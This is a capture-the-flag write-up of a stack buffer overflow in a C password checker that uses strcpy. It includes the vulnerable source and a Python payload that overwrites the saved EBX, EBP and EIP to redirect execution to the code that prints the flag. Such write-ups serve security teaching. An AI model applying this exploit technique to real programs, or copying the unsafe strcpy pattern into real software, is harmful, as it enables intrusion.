# Challenge `Super Secure System` Writeup

- **Vulnerability:** Buffer Overflow
  - Buffer overflow occurs when data exceeds the buffer's boundaries and overwrites adjacent memory locations.
- **Where:** The vulnerability is present in the `check_password` function within the C code.
  - Specifically, the `strcpy` function is used to copy the password into a buffer of size 32 bytes without checking the length of the input.
- **Impact:** By exploiting this buffer overflow, an attacker can overwrite adjacent memory areas, including the return address of the function, leading to arbitrary code execution or crash.
- **NOTE:** The provided code lacks proper input validation and uses unsafe functions like `strcpy`, which makes it susceptible to buffer overflow attacks.

## Steps to Reproduce

1. Identify the vulnerable `strcpy` function in `check_password`.
2. Create a payload that overflows the buffer and overwrites the return address. The payload consists of:
   - 32 bytes to fill the buffer (`"A" * 32`).
   - 4 bytes to overwrite in between space.
   - 4 bytes to overwrite the EBX with its previous value ("\x01\xa0\x04\x08"`)
   - 4 bytes to overwrite the EBP ("\xc8\xd0\xff\xff").
   - 4 bytes to overwrite the EIP ("\xd9\x87\x04\x08")
3. Send this payload to the program as input.
4. The payload causes a buffer overflow, potentially allowing code execution or crashing the program with an altered control flow.

[POC](`name_of_the_challenge_poc.py`)

### C Code Challenge:
````c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include "general.h"

int check_password(char* password) {
  char buffer[32];
  strcpy(buffer, password);
  if(strcmp(buffer, getflag()) == 0)
    return 1;
  return 0;
}

int main() {
  init();
  char pass[64] = {0};
  read(0, pass, 63);
  if(check_password(pass)){
      printf("Welcome back! Here is the secret flag that you already knew: %s\n", getflag());
  } else {
      printf("Unauthorized user/passwd\n");
  }
}
````
###Solution Passed to the Program:
````python
payload = "A" * 32 + "abcd" + "\x01\xa0\x04\x08"  + "\xc8\xd0\xff\xff" + "\xd9\x87\x04\x08"  
print(payload)
````
